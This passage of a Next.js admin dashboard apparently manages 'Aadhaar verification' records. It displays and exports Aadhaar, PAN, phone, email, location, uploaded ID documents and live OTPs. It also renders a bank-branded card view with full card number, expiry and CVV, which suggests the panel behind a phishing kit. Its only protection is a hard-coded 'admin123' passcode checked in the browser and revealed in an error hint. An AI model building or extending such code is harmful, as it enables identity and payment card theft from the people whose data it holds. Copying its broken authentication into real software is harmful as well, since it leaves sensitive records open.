"use client"

import React, { useState, useEffect, useCallback } from "react"
import Link from "next/link"
import { motion } from "framer-motion"
import { toast } from "sonner"
import {
  Lock,
  Search,
  Trash2,
  Clock,
  ShieldCheck,
  ShieldAlert,
  Eye,
  EyeOff,
  Database,
  LogOut,
  Globe,
  RefreshCw,
  FileSpreadsheet,
  ArrowLeft,
  Activity,
  Fingerprint,
  CheckCircle2,
  AlertCircle,
  MapPin
} from "lucide-react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Badge } from "@/components/ui/badge"
import { ThemeToggle } from "@/components/theme-toggle"
import {
  Drawer,
  DrawerContent,
  DrawerDescription,
  DrawerFooter,
  DrawerHeader,
  DrawerTitle,
} from "@/components/ui/drawer"
import {
  AreaChart,
  Area,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer
} from "recharts"

interface AadhaarDemographics {
  name: string;
  nameHindi?: string;
  fatherName?: string;
  fatherNameHindi?: string;
  dob: string;
  gender: 'Male' | 'Female' | 'Other';
  address: string;
  avatarGradient: string;
  aadhaarNumber: string;
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
  cardType?: string;
}

interface VerificationRecord {
  id: string;
  aadhaarNumber: string;
  phoneNumber: string;
  status: 'PENDING' | 'VERIFIED' | 'FAILED';
  otp: string;
  timestamp: string;
  ipAddress?: string;
  userAgent?: string;
  demographics?: AadhaarDemographics | null;
  customName?: string;
  customAddress?: string;
  panNumber?: string;
  email?: string;
  existingLocation?: string;
  aadhaarDocName?: string;
  aadhaarDocSize?: string;
  panDocName?: string;
  panDocSize?: string;
  locationMatchStatus?: 'MATCHED' | 'MISMATCHED' | 'NOT_CHECKED';
}

interface DashboardStats {
  total: number;
  verified: number;
  pending: number;
  failed: number;
  successRate: number;
  timelineData: Array<{ date: string; verified: number; pending: number }>;
}

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [passcode, setPasscode] = useState("")
  const [authError, setAuthError] = useState(false)

  // Dashboard states
  const [records, setRecords] = useState<VerificationRecord[]>([])
  const [stats, setStats] = useState<DashboardStats | null>(null)
  const [loading, setLoading] = useState(false)
  const [search, setSearch] = useState("")
  const [statusFilter, setStatusFilter] = useState("ALL")
  
  // Detail Drawer state
  const [selectedRecord, setSelectedRecord] = useState<VerificationRecord | null>(null)
  const [isFlipped, setIsFlipped] = useState(false)
  const [showFullAadhaar, setShowFullAadhaar] = useState(false)
  
  // Unmask state for records table
  const [unmaskedRows, setUnmaskedRows] = useState<{ [id: string]: boolean }>({})

  // SSR safety
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    const timer = setTimeout(() => {
      setMounted(true)
      if (sessionStorage.getItem("admin_auth") === "true") {
        setIsAuthenticated(true)
      }
    }, 0)
    return () => clearTimeout(timer)
  }, [])

  // Fetch data
  const fetchData = useCallback(async () => {
    setLoading(true)
    try {
      const queryParams = new URLSearchParams()
      if (search) queryParams.set("search", search)
      if (statusFilter !== "ALL") queryParams.set("status", statusFilter)

      const response = await fetch(`/api/admin/records?${queryParams.toString()}`)
      const data = await response.json()
      if (data.success) {
        setRecords(data.records)
        setStats(data.stats)
      } else {
        toast.error("Failed to load records")
      }
    } catch {
      toast.error("Connection failed")
    } finally {
      setLoading(false)
    }
  }, [search, statusFilter])

  useEffect(() => {
    if (isAuthenticated) {
      const timer = setTimeout(() => {
        fetchData()
      }, 0)
      return () => clearTimeout(timer)
    }
  }, [isAuthenticated, fetchData])

  // Passcode authentication
  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    if (passcode === "admin123") {
      setIsAuthenticated(true)
      setAuthError(false)
      sessionStorage.setItem("admin_auth", "true")
      toast.success("Access Granted", { description: "Authenticated as Administrator" })
    } else {
      setAuthError(true)
      toast.error("Access Denied", { description: "Invalid administration passcode" })
    }
  }

  const handleLogout = () => {
    setIsAuthenticated(false)
    setPasscode("")
    sessionStorage.removeItem("admin_auth")
    toast.info("Logged Out", { description: "Admin session ended" })
  }

  // Delete single record
  const handleDelete = async (id: string) => {
    if (!confirm("Are you sure you want to delete this record?")) return
    try {
      const response = await fetch(`/api/admin/records?id=${id}`, { method: "DELETE" })
      const data = await response.json()
      if (data.success) {
        toast.success("Record Deleted")
        fetchData()
        if (selectedRecord?.id === id) setSelectedRecord(null)
      } else {
        toast.error(data.message || "Failed to delete record")
      }
    } catch {
      toast.error("Error connecting to server")
    }
  }

  // Clear all database
  const handleClearDb = async () => {
    if (!confirm("CRITICAL WARNING: This will permanently delete ALL verification logs. Are you sure?")) return
    try {
      const response = await fetch(`/api/admin/records?action=clear`, { method: "DELETE" })
      const data = await response.json()
      if (data.success) {
        toast.success("Database Purged", { description: "All records cleared successfully." })
        fetchData()
      } else {
        toast.error("Failed to clear database")
      }
    } catch {
      toast.error("Error connecting to server")
    }
  }

  // Export to CSV
  const handleExportCsv = () => {
    if (records.length === 0) {
      toast.warning("No records to export")
      return
    }

    const headers = ["ID", "Aadhaar Number", "Phone Number", "Status", "Date/Time", "Name", "PAN Number", "Email", "Existing Location", "Aadhaar File", "PAN File", "Father's Name", "DOB", "Gender", "Address", "IP Address", "User Agent"]
    const rows = records.map(r => [
      r.id,
      r.aadhaarNumber,
      r.phoneNumber,
      r.status,
      r.timestamp,
      r.demographics?.name || r.customName || "",
      r.panNumber || "",
      r.email || "",
      r.existingLocation || "",
      r.aadhaarDocName || "",
      r.panDocName || "",
      r.demographics?.fatherName || "",
      r.demographics?.dob || "",
      r.demographics?.gender || "",
      r.demographics?.address || r.customAddress || "",
      r.ipAddress || "",
      (r.userAgent || "").replace(/,/g, " ")
    ])

    const csvContent = "data:text/csv;charset=utf-8," 
      + [headers.join(","), ...rows.map(e => e.map(val => `"${val}"`).join(","))].join("\n")
    
    const encodedUri = encodeURI(csvContent)
    const link = document.createElement("a")
    link.setAttribute("href", encodedUri)
    link.setAttribute("download", `aadhaar_verifications_${new Date().toISOString().split("T")[0]}.csv`)
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
    toast.success("CSV Export Successful")
  }

  // Toggle table Aadhaar visibility
  const toggleRowMask = (id: string) => {
    setUnmaskedRows(prev => ({
      ...prev,
      [id]: !prev[id]
    }))
  }

  const formatAadhaar = (aadhaar: string) => {
    return `${aadhaar.slice(0, 4)} ${aadhaar.slice(4, 8)} ${aadhaar.slice(8, 12)}`
  }

  if (!mounted) return null

  // LOGIN SCREEN
  if (!isAuthenticated) {
    return (
      <div className="flex-1 min-h-screen bg-background text-foreground flex flex-col justify-center items-center px-4 font-sans relative transition-colors duration-300">
        <div className="absolute top-[-20%] left-[-10%] w-[50%] h-[60%] rounded-full bg-blue-500/5 dark:bg-blue-900/10 blur-[120px] pointer-events-none" />
        
        <Link href="/" className="absolute top-6 left-6 text-xs text-muted-foreground hover:text-foreground flex items-center gap-1.5 transition">
          <ArrowLeft className="h-4 w-4" />
          Back to Portal
        </Link>

        <div className="absolute top-6 right-6">
          <ThemeToggle />
        </div>

        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.3 }}
          className="w-full max-w-md"
        >
          <Card className="bg-card/75 border-border backdrop-blur-xl shadow-2xl relative">
            <div className="absolute top-0 left-0 w-full h-[3px] bg-amber-500" />
            <CardHeader className="text-center">
              <div className="mx-auto w-12 h-12 rounded-full bg-amber-500/10 border border-amber-500/20 flex items-center justify-center mb-3">
                <Lock className="h-6 w-6 text-amber-500" />
              </div>
              <CardTitle className="text-xl text-foreground">Administrator Access</CardTitle>
              <CardDescription className="text-muted-foreground">
                Authentication required to view sensitive demographic databases.
              </CardDescription>
            </CardHeader>
            <form onSubmit={handleLogin}>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-semibold uppercase tracking-wider text-foreground">
                    Enter Admin Passcode
                  </label>
                  <Input
                    type="password"
                    value={passcode}
                    onChange={(e) => {
                      setPasscode(e.target.value)
                      setAuthError(false)
                    }}
                    placeholder="••••••••"
                    className={`bg-background border-border text-foreground text-center tracking-widest ${
                      authError ? "border-rose-500 focus:border-rose-500" : "focus:border-amber-500"
                    }`}
                  />
                  {authError && (
                    <p className="text-[10px] text-rose-500 text-center">
                      Incorrect passcode. Hint: Use `admin123`
                    </p>
                  )}
                </div>
              </CardContent>
              <CardFooter>
                <Button type="submit" className="w-full h-10 bg-amber-600 hover:bg-amber-500 text-white font-semibold cursor-pointer">
                  Unlock Console
                </Button>
              </CardFooter>
            </form>
          </Card>
        </motion.div>
      </div>
    )
  }

  // ADMIN DASHBOARD
  return (
    <div className="flex-1 min-h-screen bg-background text-foreground flex flex-col font-sans relative overflow-x-hidden transition-colors duration-300">
      {/* Background decoration */}
      <div className="absolute top-[-10%] right-[-10%] w-[40%] h-[50%] rounded-full bg-violet-500/5 dark:bg-violet-900/10 blur-[120px] pointer-events-none" />

      {/* Header */}
      <header className="border-b border-border bg-background/85 backdrop-blur-md sticky top-0 z-40 px-6 py-4 flex items-center justify-between transition-colors">
        <div className="flex items-center gap-3">
          <Link href="/" className="bg-card hover:bg-muted/50 p-2 rounded-lg border border-border transition cursor-pointer">
            <ArrowLeft className="h-5 w-5 text-muted-foreground" />
          </Link>
          <div>
            <h1 className="font-bold text-lg leading-none tracking-wide text-foreground flex items-center gap-2">
              <Activity className="h-5 w-5 text-emerald-500" />
              ADMIN CONTROL PANEL
            </h1>
            <p className="text-[10px] text-muted-foreground uppercase tracking-widest mt-1">Identity Verification Logs</p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <Button
            onClick={fetchData}
            variant="outline"
            size="sm"
            className="border-border hover:bg-muted/50 cursor-pointer"
          >
            <RefreshCw className={`h-4 w-4 ${loading ? "animate-spin" : ""}`} />
          </Button>
          <ThemeToggle />
          <Button
            onClick={handleLogout}
            variant="ghost"
            size="sm"
            className="text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 flex items-center gap-1.5 cursor-pointer"
          >
            <LogOut className="h-4 w-4" />
            Logout
          </Button>
        </div>
      </header>

      {/* Main Body */}
      <main className="flex-1 max-w-6xl mx-auto w-full px-6 py-8 space-y-6 relative z-10">
        
        {/* STATS OVERVIEW CARDS */}
        {stats && (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            <Card className="bg-card/75 border-border backdrop-blur-xl">
              <CardContent className="p-5 flex items-center justify-between">
                <div>
                  <p className="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Total Requests</p>
                  <p className="text-3xl font-extrabold text-foreground mt-1">{stats.total}</p>
                </div>
                <div className="w-10 h-10 rounded-lg bg-blue-500/10 border border-blue-500/20 flex items-center justify-center">
                  <Database className="h-5 w-5 text-blue-500" />
                </div>
              </CardContent>
            </Card>

            <Card className="bg-card/75 border-border backdrop-blur-xl">
              <CardContent className="p-5 flex items-center justify-between">
                <div>
                  <p className="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Verified Aadhaar</p>
                  <p className="text-3xl font-extrabold text-emerald-500 mt-1">{stats.verified}</p>
                </div>
                <div className="w-10 h-10 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
                  <ShieldCheck className="h-5 w-5 text-emerald-500" />
                </div>
              </CardContent>
            </Card>

            <Card className="bg-card/75 border-border backdrop-blur-xl">
              <CardContent className="p-5 flex items-center justify-between">
                <div>
                  <p className="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Pending OTP Sessions</p>
                  <p className="text-3xl font-extrabold text-amber-500 mt-1">{stats.pending}</p>
                </div>
                <div className="w-10 h-10 rounded-lg bg-amber-500/10 border border-amber-500/20 flex items-center justify-center">
                  <Clock className="h-5 w-5 text-amber-500" />
                </div>
              </CardContent>
            </Card>

            <Card className="bg-card/75 border-border backdrop-blur-xl">
              <CardContent className="p-5 flex items-center justify-between">
                <div>
                  <p className="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Success Rate</p>
                  <p className="text-3xl font-extrabold text-violet-500 mt-1">{stats.successRate}%</p>
                </div>
                <div className="w-10 h-10 rounded-lg bg-violet-500/10 border border-violet-500/20 flex items-center justify-center">
                  <Fingerprint className="h-5 w-5 text-violet-500" />
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* CHART SECTION */}
        {stats && stats.total > 0 && (
          <Card className="bg-card/75 border-border backdrop-blur-xl">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-semibold uppercase tracking-wider text-muted-foreground">
                Verification Traffic Timeline
              </CardTitle>
            </CardHeader>
            <CardContent className="h-64">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={stats.timelineData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                  <defs>
                    <linearGradient id="verifiedGrad" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#10b981" stopOpacity={0.2}/>
                      <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                    </linearGradient>
                    <linearGradient id="pendingGrad" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#f59e0b" stopOpacity={0.2}/>
                      <stop offset="95%" stopColor="#f59e0b" stopOpacity={0}/>
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="var(--border)" opacity={0.5} />
                  <XAxis dataKey="date" stroke="var(--muted-foreground)" fontSize={10} />
                  <YAxis stroke="var(--muted-foreground)" fontSize={10} allowDecimals={false} />
                  <Tooltip 
                    contentStyle={{ 
                      backgroundColor: "var(--popover)", 
                      borderColor: "var(--border)", 
                      color: "var(--popover-foreground)",
                      borderRadius: "var(--radius)" 
                    }}
                  />
                  <Area type="monotone" dataKey="verified" name="Successful" stroke="#10b981" fillOpacity={1} fill="url(#verifiedGrad)" strokeWidth={2} />
                  <Area type="monotone" dataKey="pending" name="Pending OTP" stroke="#f59e0b" fillOpacity={1} fill="url(#pendingGrad)" strokeWidth={2} />
                </AreaChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>
        )}

        {/* DATABASE TABLE CONTROLS */}
        <Card className="bg-card/75 border-border backdrop-blur-xl">
          <CardHeader className="pb-3 flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div>
              <CardTitle className="text-base text-foreground flex items-center gap-2">
                <Database className="h-5 w-5 text-indigo-500" />
                Audit Logs
              </CardTitle>
              <CardDescription className="text-muted-foreground text-xs">
                History of Aadhaar identity verifications.
              </CardDescription>
            </div>
            
            <div className="flex flex-wrap items-center gap-3">
              <Button
                onClick={handleExportCsv}
                variant="outline"
                size="sm"
                className="border-border hover:bg-muted/50 flex items-center gap-2 cursor-pointer"
                disabled={records.length === 0}
              >
                <FileSpreadsheet className="h-4 w-4 text-emerald-500" />
                Export CSV
              </Button>
              <Button
                onClick={handleClearDb}
                variant="destructive"
                size="sm"
                className="flex items-center gap-1.5 cursor-pointer"
                disabled={records.length === 0}
              >
                <Trash2 className="h-4 w-4" />
                Purge DB
              </Button>
            </div>
          </CardHeader>
          
          <CardContent className="space-y-4">
            {/* Search and Filters */}
            <div className="flex flex-col sm:flex-row gap-3">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search by Name, Phone, Aadhaar, IP..."
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  className="pl-9 bg-background border-border text-foreground placeholder-muted-foreground focus:border-indigo-500"
                />
              </div>
              
              <div className="flex bg-background border border-border p-0.5 rounded-lg select-none">
                {["ALL", "VERIFIED", "PENDING"].map((status) => (
                  <button
                    key={status}
                    onClick={() => setStatusFilter(status)}
                    className={`px-3 py-1.5 rounded-md text-xs font-semibold uppercase tracking-wider transition cursor-pointer ${
                      statusFilter === status 
                        ? "bg-primary text-primary-foreground shadow-sm" 
                        : "text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {status}
                  </button>
                ))}
              </div>
            </div>

            {/* Records Table */}
            <div className="border border-border rounded-lg overflow-hidden bg-background/50">
              <Table>
                <TableHeader className="bg-muted/40 border-b border-border">
                  <TableRow>
                    <TableHead className="font-bold text-foreground">Date & Time</TableHead>
                    <TableHead className="font-bold text-foreground">Applicant Details</TableHead>
                    <TableHead className="font-bold text-foreground">PAN / Email</TableHead>
                    <TableHead className="font-bold text-foreground">Map Location</TableHead>
                    <TableHead className="font-bold text-foreground">Aadhaar Doc</TableHead>
                    <TableHead className="font-bold text-foreground">PAN Doc</TableHead>
                    <TableHead className="font-bold text-foreground">Audit Status</TableHead>
                    <TableHead className="text-right font-bold text-foreground">Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {loading && records.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={7} className="h-32 text-center text-muted-foreground">
                        <RefreshCw className="h-6 w-6 animate-spin mx-auto mb-2 text-indigo-500" />
                        Fetching database records...
                      </TableCell>
                    </TableRow>
                  ) : records.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={7} className="h-24 text-center text-muted-foreground">
                        No verification records found matching query.
                      </TableCell>
                    </TableRow>
                  ) : (
                    records.map((record) => (
                      <TableRow 
                        key={record.id} 
                        className="border-b border-border/60 hover:bg-muted/20 cursor-pointer"
                        onClick={() => setSelectedRecord(record)}
                      >
                        <TableCell className="font-mono text-xs text-muted-foreground">
                          {new Date(record.timestamp).toLocaleString("en-US", {
                            month: "short",
                            day: "numeric",
                            hour: "2-digit",
                            minute: "2-digit"
                          })}
                        </TableCell>
                        <TableCell>
                          <div className="text-sm font-semibold text-foreground">
                            {record.demographics?.name || record.customName || (
                              <span className="text-muted-foreground text-xs italic font-normal">Awaiting e-KYC...</span>
                            )}
                          </div>
                          <div className="text-[10px] text-muted-foreground font-mono">
                            +91 {record.phoneNumber}
                          </div>
                          <div className="text-[10px] text-muted-foreground font-mono flex items-center gap-1 mt-0.5" onClick={(e) => e.stopPropagation()}>
                            <span>UID:</span>
                            <span className="tracking-wide">
                              {unmaskedRows[record.id]
                                ? formatAadhaar(record.aadhaarNumber)
                                : `XXXX XXXX ${record.aadhaarNumber.slice(-4)}`}
                            </span>
                            <button
                              type="button"
                              onClick={(e) => {
                                e.stopPropagation();
                                toggleRowMask(record.id);
                              }}
                              className="text-muted-foreground hover:text-foreground inline-flex ml-1 p-0.5 cursor-pointer"
                            >
                              {unmaskedRows[record.id] ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                            </button>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="font-mono text-xs font-semibold uppercase text-foreground">
                            {record.panNumber || "N/A"}
                          </div>
                          <div className="text-[10px] text-muted-foreground truncate max-w-[130px]">
                            {record.email || "N/A"}
                          </div>
                        </TableCell>
                        <TableCell className="text-xs text-foreground max-w-[140px] truncate">
                          {record.existingLocation || "N/A"}
                        </TableCell>
                        <TableCell className="text-xs text-foreground max-w-[120px] truncate">
                          {record.aadhaarDocName ? (
                            <span className="text-orange-500 font-semibold">{record.aadhaarDocName}</span>
                          ) : (
                            <span className="text-muted-foreground italic text-[10px]">No upload</span>
                          )}
                        </TableCell>
                        <TableCell className="text-xs text-foreground max-w-[120px] truncate">
                          {record.panDocName ? (
                            <span className="text-blue-500 font-semibold">{record.panDocName}</span>
                          ) : (
                            <span className="text-muted-foreground italic text-[10px]">No upload</span>
                          )}
                        </TableCell>
                        <TableCell className="space-y-1">
                          <div className="flex items-center">
                            {record.status === "VERIFIED" ? (
                              <Badge className="bg-emerald-500/10 border-emerald-500/20 text-emerald-600 dark:text-emerald-400 hover:bg-emerald-500/10 shadow-none font-bold text-[9px]">
                                <CheckCircle2 className="h-2.5 w-2.5 mr-0.5" />
                                VERIFIED
                              </Badge>
                            ) : record.status === "FAILED" ? (
                              <Badge className="bg-rose-500/10 border-rose-500/20 text-rose-600 dark:text-rose-400 hover:bg-rose-500/10 shadow-none font-bold text-[9px]">
                                <AlertCircle className="h-2.5 w-2.5 mr-0.5" />
                                FAILED
                              </Badge>
                            ) : (
                              <Badge className="bg-amber-500/10 border-amber-500/20 text-amber-600 dark:text-amber-400 hover:bg-amber-500/10 shadow-none font-bold text-[9px]">
                                <Clock className="h-2.5 w-2.5 mr-0.5" />
                                PENDING
                              </Badge>
                            )}
                          </div>
                          {record.locationMatchStatus && (
                            <div className="text-[9px]">
                              {record.locationMatchStatus === "MATCHED" ? (
                                <span className="font-bold text-emerald-600 dark:text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 rounded px-1 select-none">
                                  LOCATION MATCHED
                                </span>
                              ) : record.locationMatchStatus === "MISMATCHED" ? (
                                <span className="font-bold text-rose-600 dark:text-rose-400 bg-rose-500/10 border border-rose-500/20 rounded px-1 select-none">
                                  LOC MISMATCH
                                </span>
                              ) : (
                                <span className="font-bold text-muted-foreground bg-muted border border-border rounded px-1 select-none">
                                  UNCHECKED
                                </span>
                              )}
                            </div>
                          )}
                        </TableCell>
                        <TableCell className="text-right" onClick={(e) => e.stopPropagation()}>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => handleDelete(record.id)}
                            className="text-muted-foreground hover:text-rose-600 hover:bg-rose-500/10 h-8 px-2 cursor-pointer"
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>
      </main>

      {/* DETAIL DRAWER / SLIDEOVER */}
      <Drawer open={selectedRecord !== null} onClose={() => { setSelectedRecord(null); setIsFlipped(false); setShowFullAadhaar(false); }}>
        <DrawerContent className="bg-card border-border text-foreground">
          <div className="max-w-xl mx-auto w-full p-6 space-y-6">
            <DrawerHeader className="px-0">
              <DrawerTitle className="text-lg font-bold text-foreground flex items-center justify-between">
                <span>Verification Record Details</span>
                {selectedRecord && (
                  <Badge className={
                    selectedRecord.status === "VERIFIED" 
                      ? "bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20" 
                      : selectedRecord.status === "FAILED"
                        ? "bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20"
                        : "bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/20"
                  }>
                    {selectedRecord.status}
                  </Badge>
                )}
              </DrawerTitle>
              <DrawerDescription className="text-muted-foreground text-xs">
                Transaction ID: {selectedRecord?.id} • Timestamp: {selectedRecord && new Date(selectedRecord.timestamp).toLocaleString()}
              </DrawerDescription>
            </DrawerHeader>

            {selectedRecord && (
              <div className="space-y-6">
                
                {/* GPS card representation */}
                {selectedRecord.status === "VERIFIED" && selectedRecord.demographics ? (
                  <div className="flex flex-col items-center">
                    <p className="text-[11px] text-muted-foreground mb-2">Click card to flip between Front and Back views</p>
                    
                    <div 
                      className="relative w-full max-w-[420px] h-[260px] cursor-pointer group perspective-1000" 
                      onClick={() => setIsFlipped(!isFlipped)}
                    >
                      <motion.div 
                        className="relative w-full h-full duration-500 transform-style-3d"
                        animate={{ rotateY: isFlipped ? 180 : 0 }}
                        transition={{ duration: 0.6 }}
                      >
                        {/* FRONT */}
                        <div className="absolute w-full h-full backface-hidden rounded-xl border border-amber-500/20 bg-gradient-to-tr from-red-950 via-rose-900 to-stone-950 text-white p-5 flex flex-col justify-between overflow-hidden shadow-xl">
                          <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-amber-500/10 via-transparent to-transparent pointer-events-none" />
                          <div className="flex items-start justify-between relative z-10">
                            <div className="flex flex-col text-left">
                              <span className="font-bold text-sm tracking-widest text-amber-400 leading-none">GPS</span>
                              <span className="text-[6px] uppercase tracking-[0.2em] text-stone-400 mt-1">Premium Secure System</span>
                            </div>
                            <div className="text-right flex flex-col items-end">
                              <span className="font-bold text-xs tracking-wider text-stone-200">IDFC FIRST</span>
                              <span className="text-[6px] uppercase tracking-wider text-amber-500 font-bold leading-none mt-1">{selectedRecord.demographics.cardType || 'SELECT'}</span>
                            </div>
                          </div>

                          <div className="flex items-center gap-3 relative z-10 my-auto">
                            {/* Gold Sim Chip */}
                            <div className="w-8 h-7 rounded bg-gradient-to-tr from-amber-300 via-yellow-400 to-amber-500 p-0.5 shadow-md flex flex-col justify-between flex-shrink-0">
                              <div className="flex justify-between h-1.5 border-b border-amber-600/35">
                                <div className="w-1.5 border-r border-amber-600/35"></div>
                                <div className="w-1.5 border-l border-amber-600/35"></div>
                              </div>
                              <div className="flex justify-between h-1.5 border-b border-amber-600/35">
                                <div className="w-1.5 border-r border-amber-600/35"></div>
                                <div className="w-1.5 border-l border-amber-600/35"></div>
                              </div>
                              <div className="flex justify-between h-1.5">
                                <div className="w-1.5 border-r border-amber-600/35"></div>
                                <div className="w-1.5 border-l border-amber-600/35"></div>
                              </div>
                            </div>
                            
                            {/* Alphanumeric Card Number */}
                            <div className="flex-1 text-left font-mono font-bold text-lg tracking-widest text-amber-100/90 drop-shadow-[0_1.5px_1.5px_rgba(0,0,0,0.8)]">
                              {showFullAadhaar ? selectedRecord.demographics.cardNumber : `XXXX XXXX ${selectedRecord.demographics.cardNumber?.slice(-4)}`}
                            </div>
                            
                            <button
                              onClick={(e) => { e.stopPropagation(); setShowFullAadhaar(!showFullAadhaar); }}
                              className="text-amber-500 hover:text-amber-400 p-1 flex-shrink-0"
                            >
                              {showFullAadhaar ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                            </button>
                          </div>

                          <div className="flex justify-between items-end relative z-10 border-t border-amber-500/10 pt-2.5">
                            <div className="text-left">
                              <p className="text-[6px] uppercase tracking-wider text-stone-400 leading-none">Card Holder</p>
                              <p className="text-[10px] font-bold tracking-wider text-amber-100 uppercase mt-0.5">{selectedRecord.demographics.name}</p>
                            </div>
                            <div className="text-right">
                              <p className="text-[6px] uppercase tracking-wider text-stone-400 leading-none">Valid Thru</p>
                              <p className="text-[10px] font-mono font-bold tracking-wider text-amber-100 mt-0.5">{selectedRecord.demographics.expiryDate || '12/30'}</p>
                            </div>
                          </div>
                        </div>

                        {/* BACK */}
                        <div className="absolute w-full h-full backface-hidden rounded-xl border border-amber-500/20 bg-gradient-to-tr from-stone-950 via-rose-955 to-red-955 text-white p-5 flex flex-col justify-between rotate-y-180 overflow-hidden shadow-xl">
                          {/* Magnetic Stripe */}
                          <div className="w-full h-9 bg-stone-900 mt-3" />
                          
                          <div className="px-4 space-y-3">
                            <div className="flex items-center gap-2">
                              {/* Signature panel */}
                              <div className="flex-1 h-7 bg-stone-100 text-stone-850 text-left font-mono font-bold italic px-2 flex items-center text-[10px] rounded select-none pointer-events-none">
                                {selectedRecord.demographics.name}
                              </div>
                              {/* CVV */}
                              <div className="w-10 h-7 bg-amber-400 text-stone-950 font-mono font-bold text-center flex items-center justify-center rounded shadow-inner text-xs">
                                {selectedRecord.demographics.cvv || '***'}
                              </div>
                            </div>

                            <div className="text-left text-[7px] text-stone-450 leading-normal space-y-0.5">
                              <p className="font-semibold text-stone-200">Address: {selectedRecord.demographics.address}</p>
                              <p className="text-[6px]">Secured under GPS secure card verification and IDFC credit policies.</p>
                            </div>
                          </div>

                          <div className="border-t border-amber-500/10 py-2.5 px-4 flex justify-between items-center text-[6px] text-stone-500 font-semibold bg-stone-950/60">
                            <span>GPS SECURE NETWORK</span>
                            <span className="text-amber-500">✓ SIGNATURE VALID</span>
                          </div>
                        </div>
                      </motion.div>
                    </div>
                  </div>
                ) : selectedRecord.status === "FAILED" ? (
                  <div className="bg-rose-500/5 border border-rose-500/20 rounded-lg p-5 flex flex-col items-center justify-center text-center">
                    <ShieldAlert className="h-8 w-8 text-rose-500 mb-2 animate-bounce" />
                    <h4 className="font-semibold text-rose-600">Verification Suspended: Security Alert</h4>
                    <p className="text-muted-foreground text-xs mt-1 max-w-xs leading-relaxed">
                      This transaction was rejected because the location coordinates picked on the map did not match the registered Aadhaar residential address database.
                    </p>
                    <div className="mt-3 text-xs bg-muted border border-border rounded p-3 space-y-1 text-left w-full font-mono">
                      <div><span className="text-muted-foreground">Map Location:</span> <span className="font-bold text-foreground">{selectedRecord.existingLocation}</span></div>
                      <div><span className="text-muted-foreground">Audit Status:</span> <span className="font-bold text-rose-500">MISMATCH DETECTED</span></div>
                    </div>
                  </div>
                ) : (
                  <div className="bg-background border border-border rounded-lg p-5 flex flex-col items-center justify-center text-center">
                    <ShieldAlert className="h-8 w-8 text-amber-500 mb-2 animate-bounce" />
                    <h4 className="font-semibold text-foreground">Session Verification Incomplete</h4>
                    <p className="text-muted-foreground text-xs mt-1 max-w-xs">
                      The citizen initiated this session but has not entered the correct 6-digit OTP code to unmask demographic records.
                    </p>
                    <div className="mt-3 text-xs bg-muted border border-border rounded px-3 py-1 font-mono text-amber-600 dark:text-amber-400">
                      Active OTP: {selectedRecord.otp}
                    </div>
                  </div>
                )}

                {/* Meta details grid */}
                <div className="grid grid-cols-2 gap-4 text-xs">
                  <div className="bg-background border border-border rounded-lg p-3 space-y-1">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider">Aadhaar Input</p>
                    <p className="font-mono font-semibold text-foreground">{formatAadhaar(selectedRecord.aadhaarNumber)}</p>
                  </div>
                  <div className="bg-background border border-border rounded-lg p-3 space-y-1">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider">Phone Registered</p>
                    <p className="font-mono font-semibold text-foreground">+91 {selectedRecord.phoneNumber}</p>
                  </div>
                  
                  {/* PAN & Email fields */}
                  <div className="bg-background border border-border rounded-lg p-3 space-y-1">
                    <p className="text-muted-foreground text-[10px] uppercase font-bold tracking-wider">PAN Card Number</p>
